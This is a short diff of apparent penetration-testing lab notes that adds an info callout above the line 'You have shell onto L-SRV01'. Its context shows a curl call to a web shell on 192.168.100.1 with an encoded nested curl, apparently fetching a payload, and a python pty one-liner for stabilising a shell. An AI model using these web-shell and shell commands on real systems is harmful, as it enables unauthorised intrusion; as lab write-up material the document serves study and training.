@@ -69,6 +69,7 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 - Stabilize the shell.
 	`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
+> [!INFO]
 You have shell onto  L-SRV01.
 
 
